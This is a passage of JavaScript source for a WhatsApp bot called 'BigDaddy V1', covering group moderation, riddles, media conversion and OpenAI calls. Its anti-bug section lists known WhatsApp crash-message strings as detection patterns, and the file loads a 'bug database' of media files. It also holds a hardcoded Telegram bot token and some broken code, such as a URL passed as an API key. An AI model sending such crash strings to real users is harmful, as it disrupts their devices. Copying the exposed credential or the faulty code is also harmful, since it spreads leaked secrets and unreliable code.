//base by @phistar
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const NodeCache = require('node-cache');
const settings = require('./phistarbot.js'); // Import settings
//bug database 
var wkwk = fs.readFileSync(`./16/p.mp3`)
var xsteek = fs.readFileSync(`./16/p.webp`)
var o = fs.readFileSync(`./16/p.jpg`)
//database
var antilinkall = fs.readFileSync("database/antilinkall.json", "utf8");
var _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
var owner = fs.readFileSync("database/owner.json", "utf8");
var premium = fs.readFileSync("database/premium.json", "utf8");
console.log(premium); 

var _afk = JSON.parse(fs.readFileSync('./database/afk-user.json', 'utf8'));
var hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
var VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
var StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
var ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
var VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
var DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
var ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
var ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))
//time
var xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        var xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        var time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Hey am BigDaddy
V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Hey am BigDaddy
V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Hey am BigDaddy
V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Hey am BigDaddy
V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Hey am BigDaddy
V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Hey am BigDaddy
V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
 } 
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : ''
        var prefa = "!"; // Default prefix for commands
var budy = (typeof m.text == 'string' ? m.text : '');
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix;
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const ytdl = require('ytdl-core');
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = XeonBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || XeonBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(XeonBotInc, m, premium);
        // Read the current Anti-Link group list
const antilinkGroups = JSON.parse(fs.readFileSync('./database/antilinkall.json', 'utf-8') || '[]');
let chatbot = false; // Default state of the chatbot

if (m.isGroup && antilinkGroups.includes(m.chat)) {
    const linkRegex = /https?:\/\/[^\s]+/; // Regex to detect links
    if (linkRegex.test(m.text)) {
        // Delete the message
        await XeonBotInc.sendMessage(m.chat, { delete: m.key });

        // Warn the sender
        replygcxeon(`⚠️ Links are not allowed in this group, @${m.sender.split('@')[0]}!`);

        // Optional: Remove the sender (uncomment to enable)
        // await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}
// Use your bot's message handling logic to respond to user questions.       
//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Phistar-media/phistar.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
global.userSessions = {};  // Initialize user sessions globally
async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Phistar',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}
process.setMaxListeners(50); // Increase the listener limit

// Your OpenAI API key
const API_KEY = `https://api.abrotech.com.ng/api/chatgpt3?prompt=${text}?&apikey=abrotech`

// Function to handle text-based commands (Smart Daddy)
async function handleSmartDaddy(question) {
  try {
    const response = await axios.post('https://api.openai.com/v1/completions', {
      model: 'gpt-4', // Specify the model
      prompt: question,
      max_tokens: 100,
      temperature: 0.7,
    }, {
      headers: {
        'Authorization': `Bearer ${API_KEY}`,
        'Content-Type': 'application/json',
      },
    });

    // Return the text-based response from GPT
    return response.data.choices[0].text.trim();
  } catch (error) {
    console.error('Error in Smart Daddy:', error);
    throw new Error('Smart Daddy request failed.');
  }
}

// Function to handle image generation commands (Generate)
async function handleGenerate(prompt) {
  try {
    const response = await axios.post('https://api.openai.com/v1/images/generations', {
      prompt: prompt, // The image description input
      n: 1,           // Number of images to generate
      size: "1024x1024",
    }, {
      headers: {
        'Authorization': `Bearer ${API_KEY}`,
        'Content-Type': 'application/json',
      },
    });

    // Return the image URL
    return response.data.data[0].url;
  } catch (error) {
    console.error('Error in Generate:', error);
    throw new Error('Image generation request failed.');
  }
}

// Global object to track user cooldowns
const userCooldowns = {};

// Main function to handle user messages with cooldown logic
async function handleUserMessage(userId, input) {
  const currentTime = Date.now();
  const cooldownTime = 2 * 60 * 1000; // 2 minutes in milliseconds

  try {
    // Check if the user is in cooldown
    if (userCooldowns[userId] && (currentTime - userCooldowns[userId] < cooldownTime)) {
      return 'Please wait 2 minutes before using this command again to avoid exceeding limits.';
    }

    // Reset cooldown for this user
    userCooldowns[userId] = currentTime;

    // Handle the user's input and respond accordingly
    if (input.startsWith('Smart Daddy')) {
      const question = input.replace('Smart Daddy', '').trim();
      const answer = await handleSmartDaddy(question);
      return answer + '\n\n⚠️ Please pause for 2 minutes before using this command again.';
    } else if (input.startsWith('Generate')) {
      const description = input.replace('Generate', '').trim();
      const imageURL = await handleGenerate(description);
      return imageURL + '\n\n⚠️ Please pause for 2 minutes before using this command again.';
    } else {
      return 'Invalid command. Use "Smart Daddy" for questions or "Generate" for images.';
    }
  } catch (err) {
    // Log the error and return a default message without affecting the bot flow
    console.error('Error handling user message:', err);
    return 'An error occurred while processing your request.';
  }
}
const devinettes = [
  {
    question: "I can fly without wings, who am I?",
    reponse: "The weather",
  },
  {
    question: "I'm always hungry, the more I eat, the fatter I become. Who am I?",
    reponse: "A black hole",
  },
  {
    question: "What has keys but can't open locks?",
    reponse: "A piano",
  },
  {
    question: "The more you take, the more you leave behind. What am I?",
    reponse: "Footsteps",
  },
  {
    question: "What comes once in a minute, twice in a moment, but never in a thousand years?",
    reponse: "The letter 'M'",
  },
  {
    question: "What has a head, a tail, is brown, and has no legs?",
    reponse: "A penny",
  },
  {
    question: "What has hands but can’t clap?",
    reponse: "A clock",
  },
  {
    question: "What can travel around the world while staying in the same corner?",
    reponse: "A stamp",
  },
  {
    question: "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?",
    reponse: "An echo",
  },
  {
    question: "I shave every day, but my beard stays the same. What am I?",
    reponse: "A barber",
  },
  {
    question: "You see me once in June, twice in November, and not at all in May. What am I?",
    reponse: "The letter 'E'",
  },
  {
    question: "What can you break, even if you never pick it up or touch it?",
    reponse: "A promise",
  },
  {
    question: "I have branches, but no fruit, trunk, or leaves. What am I?",
    reponse: "A bank",
  },
  {
    question: "What has to be broken before you can use it?",
    reponse: "An egg",
  },
  {
    question: "What has an eye but cannot see?",
    reponse: "A needle",
  },
  {
    question: "The more of this you take, the more you leave behind. What is it?",
    reponse: "Footsteps",
  },
  {
    question: "What is full of holes but still holds water?",
    reponse: "A sponge",
  },
  {
    question: "What gets wet while drying?",
    reponse: "A towel",
  },
  {
    question: "I’m light as a feather, yet the strongest person can’t hold me for five minutes. What am I?",
    reponse: "Your breath",
  },
  {
    question: "What invention lets you look right through a wall?",
    reponse: "A window",
  },
  {
    question: "What goes up but never comes down?",
    reponse: "Your age",
  },
  {
    question: "What has many keys but can’t open a single lock?",
    reponse: "A piano",
  },
  {
    question: "Where does today come before yesterday?",
    reponse: "In a dictionary",
  },
  {
    question: "What has one eye, but can’t see?",
    reponse: "A needle",
  },
  {
    question: "What is so fragile that saying its name breaks it?",
    reponse: "Silence",
  },
  {
    question: "What can run but never walks, has a bed but never sleeps, has a mouth but never talks?",
    reponse: "A river",
  },
  {
    question: "What can fill a room but takes up no space?",
    reponse: "Light",
  },
  {
    question: "If you drop me, I’m sure to crack, but give me a smile, and I’ll always smile back. What am I?",
    reponse: "A mirror",
  }
];
function convertToAudio(inputBuffer, outputExtension) {
    return new Promise((resolve, reject) => {
        const inputFile = path.join(__dirname, `input.${outputExtension}`);
        const outputFile = path.join(__dirname, `output.mp3`);
        
        // Save the input file (audio buffer) to disk
        fs.writeFileSync(inputFile, inputBuffer);

        // Run ffmpeg to convert to mp3
        const ffmpeg = spawn('ffmpeg', [
            '-i', inputFile,
            '-vn',  // No video
            '-ac', '2',  // Stereo audio
            '-b:a', '128k',  // Audio bitrate
            '-ar', '44100',  // Audio sample rate
            outputFile  // Output file name
        ]);

        ffmpeg.on('close', (code) => {
            if (code !== 0) {
                reject(`Error during conversion, code: ${code}`);
                return;
            }
            // Read the output file (MP3) and resolve the buffer
            const audioBuffer = fs.readFileSync(outputFile);
            fs.unlinkSync(inputFile);  // Clean up input file
            fs.unlinkSync(outputFile); // Clean up output file
            resolve(audioBuffer);
        });

        ffmpeg.on('error', (err) => {
            reject(err);
        });
    });
}
// Helper function to handle the video conversion
function convertToVideo(inputBuffer, outputExtension) {
    return new Promise((resolve, reject) => {
        const inputFile = path.join(__dirname, `input.${outputExtension}`);
        const outputFile = path.join(__dirname, `output.mp4`);
        
        // Save the input file (video buffer) to disk
        fs.writeFileSync(inputFile, inputBuffer);

        // Run ffmpeg to convert to mp4
        const ffmpeg = spawn('ffmpeg', [
            '-i', inputFile,
            '-c:v', 'libx264',  // Video codec for mp4
            '-c:a', 'aac',      // Audio codec for mp4
            '-b:a', '128k',     // Audio bitrate
            '-ar', '44100',     // Audio sample rate
            '-crf', '32',       // Quality factor
            '-preset', 'slow',  // Slow but high-quality encoding
            outputFile
        ]);

        ffmpeg.on('close', (code) => {
            if (code !== 0) {
                reject(`Error during conversion, code: ${code}`);
                return;
            }
            // Read the output file (MP4) and resolve the buffer
            const videoBuffer = fs.readFileSync(outputFile);
            fs.unlinkSync(inputFile);  // Clean up input file
            fs.unlinkSync(outputFile); // Clean up output file
            resolve(videoBuffer);
        });

        ffmpeg.on('error', (err) => {
            reject(err);
        });
    });
}
async function loading () {
var xeonlod = [
"《 *BIG DADDY V1*》10%",
"《 *INITIATING*》30%",
"《 *POWERED BY PHISTAR*》50%",
"《 *8% ALMOST DONE*》80%",
"《 *BIG DADDY V1*》100%",
"*BigDaddyV1* 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 💥..."
]
let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!XeonBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            XeonBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        XeonBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        XeonBotInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        XeonBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }
        let antibug = false; // Default state: OFF

const antibugMessage = `
🚫 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 ⚠️  
☠️ 𝐀𝐧𝐭𝐢-𝐁𝐮𝐠 𝐒𝐲𝐬𝐭𝐞𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ⚡  
⚠️◼️◾◽ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓𝐋𝐘 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 ◽◾◼️⚠️  
🚫 **𝐀𝐥𝐥 𝐛𝐮𝐠 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬 𝐰𝐢𝐥𝐥 𝐟𝐚𝐢𝐥!** 🚫
`;

XeonBotInc.ev.on("messages.upsert", async (m) => {
  try {
    if (!antibug) return; // Exit if Anti-Bug is OFF

    const msg = m.messages[0];
    const sender = msg.key.remoteJid;

    // Skip if message is invalid or sent by the bot
    if (!msg.message || msg.key.fromMe) return;

    const messageContent = JSON.stringify(msg.message);
    const senderID = msg.key.participant || sender;

    // Payload Detection Logic (including the new sequence check)
    if (
      messageContent.length > 5000 || // Long payloads
      /(\u200B|\u200C|\u200D|\u202C|\u202E)/.test(messageContent) || // Invisible Unicode
      /crash|freeze|payload|malicious/i.test(messageContent) || // Bug keywords
      messageContent.includes("⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") || // Special Sequence 1
      messageContent.includes("ٯٯ𠀋ܱܰٯٯٯٯܱܰ𠀋ܱܰ") || // Special Sequence 2
      messageContent.includes("@529999997*.🔥؄ٽ؄🔥.*@234237*.🔥؄ٽ؄🔥.*@561623423*.~~.*@4124227*.🔥؄ٽ؄🔥.*@777777*.🔥؄ٽ؄🔥.*@529995531316*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@529995531316*.🤴") || // Special Sequence 3
      messageContent.includes("‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲") || // Special Sequence 4
      messageContent.includes("ꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹ") // New Special Sequence
    ) {
      console.log(`🚨 Strong Payload Detected from ${senderID}`);

      // Send warning to the flagged user
      await XeonBotInc.sendMessage(sender, { text: antibugMessage });

      // Send alert to the bot owner
      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
        text: senderID.split("@")[0] + `🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️`});

      // Block the sender
      await XeonBotInc.updateBlockStatus(sender, "block");

      console.log(`🚫 User ${senderID} has been blocked and reported.`);
    }
  } catch (err) {
    console.error("❌ Error in Anti-Bug System:", err);
  }
});
        if (m.message) {
                             if (m.mtype === "LiveLocationMessage") {
                               newly = "\n".repeat(0x3e8);
                               await XeonBotInc.sendMessage(m.chat, {
                                 'text': newly
                               });
                               await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                 'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                               });
                               await XeonBotInc.updateBlockStatus(m.sender, "block");
                             }
                           }          
              if (m.message) {
                                    if (m.mtype === "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ") {
                                      newly = "\n".repeat(0x3e8);
                                      await XeonBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await XeonBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }
               if (m.message) {
                                    if (m.mtype === "⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") {
                                      newly = "\n".repeat(0x3e8);
                                      await XeonBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await XeonBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }

  
                  
                     if (m.message) {
